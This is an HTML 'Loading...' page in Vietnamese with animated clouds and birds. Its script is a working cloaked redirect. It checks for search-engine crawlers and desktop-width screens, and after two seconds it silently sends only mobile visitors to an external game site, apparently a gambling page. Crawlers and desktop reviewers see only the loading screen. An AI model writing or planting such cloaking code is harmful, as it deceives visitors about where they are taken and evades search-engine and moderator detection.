<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(to bottom, #87CEFA, #B0E0E6);
            overflow: hidden;
        }
        .loading-container {
            text-align: center;
            font-family: Arial, sans-serif;
        }
        .loading-text {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
        }
        .clouds {
            position: relative;
            width: 100%;
            height: 200px;
            background: url('clouds.png') repeat-x;
            animation: moveClouds 10s linear infinite;
        }
        .birds {
            position: absolute;
            top: 50px;
            left: 0;
            width: 100%;
            height: 100px;
            background: url('birds.png') repeat-x;
            animation: moveBirds 15s linear infinite;
        }
        @keyframes moveClouds {
            from { background-position: 0 0; }
            to { background-position: -1000px 0; }
        }
        @keyframes moveBirds {
            from { background-position: 0 0; }
            to { background-position: -1000px 0; }
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="loading-text">Vui lòng đợi 2 giây...</div>
        <div class="clouds"></div>
        <div class="birds"></div>
    </div>

    <script>
        function isBotOrDesktop() {
            const userAgent = navigator.userAgent.toLowerCase();
            const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot/.test(userAgent);
            const isDesktop = window.innerWidth > 1024; // Hoặc tùy chỉnh theo kích thước màn hình bạn muốn

            return isBot || isDesktop;
        }

        if (!isBotOrDesktop()) {
            setTimeout(function() {
                window.location.href = "https://taisieuno.us/game/";
            }, 2000);
        } else {
            console.log("Bot hoặc trình duyệt trên desktop phát hiện. Không chuyển hướng.");
        }
    </script>
</body>
</html>
